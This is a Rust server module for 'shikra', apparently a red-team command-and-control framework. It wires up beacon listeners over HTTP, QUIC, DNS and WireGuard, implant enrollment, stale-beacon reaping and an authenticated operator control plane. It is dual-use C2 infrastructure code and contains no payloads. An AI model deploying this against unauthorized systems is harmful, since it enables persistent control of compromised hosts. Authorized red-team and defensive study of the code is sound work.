pub mod auth;
pub mod bootstrap;
pub mod dns;
pub mod enrollment;
pub mod http;
pub mod listeners;
pub mod msf;
pub mod quic;
pub mod rate_limit;
pub mod recon;
pub mod services;
pub mod state;
pub mod tunnel;
pub mod webhook;
pub mod wg;

use anyhow::{Context, Result};
use services::{AgentLinkService, ControlPlaneService};
use shikra_core::config::ServerConfig;
use shikra_proto::v1::agent_link_server::AgentLinkServer;
use shikra_proto::v1::control_plane_server::ControlPlaneServer;
use state::ServerState;
use std::future::Future;
use std::sync::Arc;
use tokio::net::{TcpListener, UdpSocket};
use tokio_stream::wrappers::TcpListenerStream;
use tonic::service::interceptor::InterceptedService;
use tonic::transport::{Identity, Server, ServerTlsConfig};
use tracing::info;

pub use state::SessionRegistry;

/// Maximum number of queued tasks delivered in a single beacon poll.
pub const BEACON_TASKS_PER_POLL: usize = 16;

/// Frame opcode for enrollment requests on beacon transports.
pub const OP_ENROLL: u8 = 1;
/// Frame opcode for encrypted beacon polls on beacon transports.
pub const OP_POLL: u8 = 2;

/// Optional UDP listeners for the DNS and WireGuard beacon transports.
#[derive(Default)]
pub struct UdpListeners {
    pub dns: Option<UdpSocket>,
    pub wg: Option<UdpSocket>,
}

pub async fn run(config: ServerConfig) -> Result<()> {
    let grpc_listener = TcpListener::bind(config.grpc_addr)
        .await
        .with_context(|| format!("failed to bind gRPC {}", config.grpc_addr))?;
    let health_listener = TcpListener::bind(config.health_addr)
        .await
        .with_context(|| format!("failed to bind health endpoint {}", config.health_addr))?;

    // Beacon listeners are started on demand from the operator console once
    // the control plane is up; only the operator channel binds at boot.
    run_with_listeners(
        config,
        grpc_listener,
        health_listener,
        None,
        None,
        UdpListeners::default(),
        shutdown_signal(),
    )
    .await
}

pub async fn run_with_listeners(
    config: ServerConfig,
    grpc_listener: TcpListener,
    health_listener: TcpListener,
    http_listener: Option<TcpListener>,
    quic_endpoint: Option<quinn::Endpoint>,
    udp: UdpListeners,
    shutdown: impl Future<Output = ()> + Send + 'static,
) -> Result<()> {
    let pool = shikra_store::connect_and_migrate(&config.database_url)
        .await
        .context("failed to connect to PostgreSQL or run migrations")?;

    let bootstrap = bootstrap::bootstrap(&config.state_dir)?;
    let profiles = Arc::new(tokio::sync::RwLock::new(
        shikra_transport::profile::ProfileSet::load_or_default(&config.state_dir)
            .context("failed to load C2 profiles")?,
    ));
    let engagement_id = shikra_store::repo::default_engagement(&pool)
        .await
        .context("failed to initialize default engagement")?;

    let profile_count = profiles.read().await.len();
    info!(
        server_identity = %bootstrap.server_identity_hex(),
        enroll_token_file = %config.state_dir.join("enroll.token").display(),
        operator_token_file = %config.state_dir.join("operator.token").display(),
        ca = %config.state_dir.join("ca.pem").display(),
        profiles = profile_count,
        "operator enrollment material ready"
    );

    let hosting_dir = config.state_dir.join("hosted");
    std::fs::create_dir_all(&hosting_dir)
        .with_context(|| format!("failed to create hosting dir {}", hosting_dir.display()))?;

    let state = Arc::new(ServerState {
        pool: pool.clone(),
        identity: Arc::new(bootstrap.server_identity),
        enroll_token: Arc::new(bootstrap.enroll_token),
        operator_token: Arc::new(bootstrap.operator_token),
        engagement_id,
        sessions: Arc::new(SessionRegistry::new()),
        tunnels: Arc::new(tunnel::TunnelHub::new()),
        forwards: Arc::new(tunnel::ForwardRegistry::new()),
        operators: Arc::new(state::OperatorRegistry::new()),
        hosting_dir: Arc::new(hosting_dir),
        armory_public: bootstrap.armory_public,
        enroll_limiter: Arc::new(rate_limit::AttemptLimiter::new(
            30,
            std::time::Duration::from_secs(60),
        )),
        profiles: profiles.clone(),
        state_dir: Arc::new(config.state_dir.clone()),
        listeners: Arc::new(listeners::ListenerRegistry::new()),
        webhook: Arc::new(tokio::sync::RwLock::new(webhook::load(&config.state_dir))),
        relay_token: Arc::new(bootstrap.relay_token.clone()),
        external_tokens: Arc::new(tokio::sync::Mutex::new(std::collections::HashMap::new())),
    });

    // Seed the RBAC registry from the database.
    seed_operators(&state).await;

    let health_state = HealthState { pool: pool.clone() };
    let health_local_addr = health_listener.local_addr()?;
    let health_task = tokio::spawn(async move {
        let router = axum::Router::new()
            .route("/healthz", axum::routing::get(healthz))
            .route("/readyz", axum::routing::get(readyz))
            .route("/version", axum::routing::get(version))
            .with_state(health_state);
        if let Err(err) = axum::serve(health_listener, router).await {
            tracing::error!(%err, "health server exited");
        }
    });

    let http_task = match http_listener {
        Some(listener) => {
            let addr = listener.local_addr()?;
            let router = http::router(state.clone(), profiles.clone());
            let profile_count = profiles.read().await.len();
            info!(
                %addr,
                profiles = profile_count,
                "HTTP beacon listener ready"
            );
            Some(tokio::spawn(async move {
                if let Err(err) = axum::serve(listener, router).await {
                    tracing::error!(%err, "HTTP beacon listener exited");
                }
            }))
        }
        None => None,
    };

    let quic_task = quic_endpoint.map(|endpoint| {
        let state = state.clone();
        tokio::spawn(async move {
            quic::serve(endpoint, state).await;
        })
    });

    let dns_task = udp.dns.map(|socket| {
        let state = state.clone();
        let zone = config.dns_zone.clone();
        tokio::spawn(async move {
            dns::serve(socket, state, zone).await;
        })
    });

    let wg_task = udp.wg.map(|socket| {
        let state = state.clone();
        let state_dir = config.state_dir.clone();
        tokio::spawn(async move {
            if let Err(err) = wg::serve(socket, state, state_dir).await {
                tracing::error!(%err, "WireGuard beacon listener exited");
            }
        })
    });

    // Stale-beacon reaper: mark silent beacons stale so tasks fail fast and
    // the console reflects reality without waiting for the full task timeout.
    // Sessions stale for over 10 minutes are retired entirely.
    let reaper_task = {
        let state = state.clone();
        tokio::spawn(async move {
            let mut ticker = tokio::time::interval(std::time::Duration::from_secs(15));
            loop {
                ticker.tick().await;
                let now = time::OffsetDateTime::now_utc();
                for handle in state.sessions.list().await {
                    if !handle.is_beacon {
                        continue;
                    }
                    let (last_seen, status) = {
                        let info = handle.info.lock().await;
                        (
                            info.last_seen
                                .as_ref()
                                .map(shikra_transport::wire::from_timestamp),
                            info.status,
                        )
                    };
                    let Some(last_seen) = last_seen else { continue };
                    let elapsed = (now - last_seen).whole_seconds().max(0) as u64;
                    let stale = status == shikra_proto::v1::SessionStatus::Stale as i32;
                    if stale {
                        if elapsed >= 600 {
                            state.retire_session(&handle).await;
                        }
                        continue;
                    }
                    if elapsed >= handle.stale_after_secs().await {
                        state.mark_session_stale(&handle).await;
                    }
                }
            }
        })
    };

    let tls = ServerTlsConfig::new().identity(Identity::from_pem(
        bootstrap.tls.server_cert_pem.as_str(),
        bootstrap.tls.server_key_pem.as_str(),
    ));

    let agent_service = AgentLinkService::new(state.clone());
    let control_service = ControlPlaneService::new(state.clone());
    let auth = auth::OperatorAuth::new(state.clone());

    info!(
        grpc = %grpc_listener.local_addr()?,
        health = %health_local_addr,
        "shikra-server listening"
    );

    const MAX_MESSAGE_SIZE: usize = 8 * 1024 * 1024;
    let server_result = Server::builder()
        .tls_config(tls)
        .context("failed to configure TLS")?
        .add_service(
            AgentLinkServer::new(agent_service)
                .max_decoding_message_size(MAX_MESSAGE_SIZE)
                .max_encoding_message_size(MAX_MESSAGE_SIZE),
        )
        .add_service(InterceptedService::new(
            ControlPlaneServer::new(control_service)
                .max_decoding_message_size(MAX_MESSAGE_SIZE)
                .max_encoding_message_size(MAX_MESSAGE_SIZE),
            auth,
        ))
        .serve_with_incoming_shutdown(TcpListenerStream::new(grpc_listener), shutdown)
        .await;

    health_task.abort();
    reaper_task.abort();
    state.listeners.stop_all().await;
    if let Some(task) = http_task {
        task.abort();
    }
    if let Some(task) = quic_task {
        task.abort();
    }
    if let Some(task) = dns_task {
        task.abort();
    }
    if let Some(task) = wg_task {
        task.abort();
    }
    server_result.context("gRPC server exited with error")?;
    info!("shikra-server shutdown complete");
    Ok(())
}

fn init_tracing(format: shikra_core::config::LogFormat) {
    let filter = tracing_subscriber::EnvFilter::try_from_default_env()
        .unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("info"));
    match format {
        shikra_core::config::LogFormat::Text => {
            tracing_subscriber::fmt().with_env_filter(filter).init()
        }
        shikra_core::config::LogFormat::Json => tracing_subscriber::fmt()
            .json()
            .with_env_filter(filter)
            .init(),
    }
}

/// Called by main after loading config.
pub fn tracing_from_config(config: &ServerConfig) {
    init_tracing(config.log_format);
}

/// Loads operator tokens from the database into the in-memory RBAC registry.
async fn seed_operators(state: &ServerState) {
    match shikra_store::repo_team::list_operators(&state.pool).await {
        Ok(operators) => {
            for operator in operators {
                if let Some(token_hash) = operator.token_hash {
                    state.operators.insert(
                        token_hash,
                        state::OperatorIdentity {
                            id: operator.id,
                            name: operator.name,
                            role: state::OperatorRole::parse(&operator.role),
                        },
                    );
                }
            }
        }
        Err(err) => tracing::warn!(%err, "failed to seed operator registry"),
    }
}

#[derive(Clone)]
struct HealthState {
    pool: sqlx::PgPool,
}

async fn healthz() -> axum::Json<serde_json::Value> {
    axum::Json(serde_json::json!({ "status": "ok" }))
}

async fn readyz(
    axum::extract::State(state): axum::extract::State<HealthState>,
) -> (axum::http::StatusCode, axum::Json<serde_json::Value>) {
    match sqlx::query("SELECT 1").execute(&state.pool).await {
        Ok(_) => (
            axum::http::StatusCode::OK,
            axum::Json(serde_json::json!({ "status": "ready" })),
        ),
        Err(err) => (
            axum::http::StatusCode::SERVICE_UNAVAILABLE,
            axum::Json(serde_json::json!({ "status": "degraded", "error": err.to_string() })),
        ),
    }
}

async fn version() -> axum::Json<serde_json::Value> {
    axum::Json(serde_json::json!({
        "name": "shikra-server",
        "version": env!("CARGO_PKG_VERSION"),
    }))
}

pub async fn shutdown_signal() {
    let ctrl_c = async {
        tokio::signal::ctrl_c()
            .await
            .expect("failed to install Ctrl+C handler");
    };

    #[cfg(unix)]
    let terminate = async {
        tokio::signal::unix::signal(tokio::signal::unix::SignalKind::terminate())
            .expect("failed to install SIGTERM handler")
            .recv()
            .await;
    };

    #[cfg(not(unix))]
    let terminate = std::future::pending::<()>();

    tokio::select! {
        () = ctrl_c => {},
        () = terminate => {},
    }

    info!("shutdown signal received");
}
